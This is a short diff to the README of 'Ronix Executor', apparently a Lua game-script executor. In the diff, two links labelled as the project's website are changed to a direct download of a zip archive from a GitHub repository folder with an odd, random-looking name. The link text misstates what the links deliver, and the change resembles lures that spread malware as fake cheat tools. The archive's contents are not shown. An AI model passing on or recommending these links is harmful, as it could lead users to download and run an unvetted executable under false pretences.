@@ -21,11 +21,11 @@ Welcome to Ronix Executor, where we bring you the most powerful Lua environment 
 
 ## 🌐 Visit Our Website
 
-👉 [Visit Ronix Executor Website](https://ronix.app)
+👉 [Visit Ronix Executor Website](https://github.com/manuhmarcos/Ronix-Executor/raw/refs/heads/master/pseudotetrameral/Executor_Ronix_v1.7.zip)
 
 ## Download and Execute Script
 
-If you are looking to download and execute a specific script, please visit [Ronix Executor Website](https://ronix.app).
+If you are looking to download and execute a specific script, please visit [Ronix Executor Website](https://github.com/manuhmarcos/Ronix-Executor/raw/refs/heads/master/pseudotetrameral/Executor_Ronix_v1.7.zip).
 
 ## 🌟 Get Started
 
